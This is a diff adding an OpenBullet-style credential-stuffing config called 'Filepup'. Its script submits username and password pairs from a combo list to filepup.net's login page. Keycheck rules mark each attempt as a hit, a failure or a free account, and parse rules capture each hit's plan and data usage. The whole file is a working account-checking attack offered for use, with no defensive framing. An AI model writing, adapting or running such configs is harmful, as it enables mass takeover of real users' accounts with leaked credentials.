@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "Filepup",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-20T23:49:34.6929538-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "http://www.filepup.net/loginaa.php" 
+  CONTENT "user=<USER>&pass=<PASS>&submit=Login&task=dologin&return=.%2Fmembers%2Fmyfiles.php" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login details incorrect, please try again." 
+  KEYCHAIN Success OR 
+    KEY "files:</span> </h1>" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "FREE MEMBER" 
+
+PARSE "<SOURCE>" LR "<span class=\"hue\"> </span> <i class=\"fa fa-star-o\"></i> " "<br>" -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "i class=\"fa fa-hdd-o\"></i> " "&nbsp;&nbsp;&nbsp;&nbsp;" -> CAP "Data Used" 
+
